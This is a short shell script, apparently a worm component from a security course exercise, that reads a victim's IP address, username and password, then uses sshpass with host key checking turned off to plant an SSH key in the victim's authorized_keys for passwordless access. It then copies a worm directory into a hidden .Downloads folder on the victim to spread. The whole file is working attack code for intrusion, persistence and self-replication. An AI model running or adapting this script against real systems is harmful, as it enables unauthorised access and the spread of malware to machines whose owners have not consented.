#!/bin/sh

#connect to victim and ssh without password
read victim_ip username password
ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
sshpass -p "$password" scp -o "StrictHostKeyChecking no" ~/.ssh/id_rsa.pub $username@$victim_ip:~
sshpass -p "$password" ssh $username@$victim_ip 'mkdir .Downloads; mkdir .ssh; mv id_rsa.pub .ssh/authorized_keys'

#replicate worm through ssh
scp -r ../0516020-0516066 $username@$victim_ip:~/.Downloads



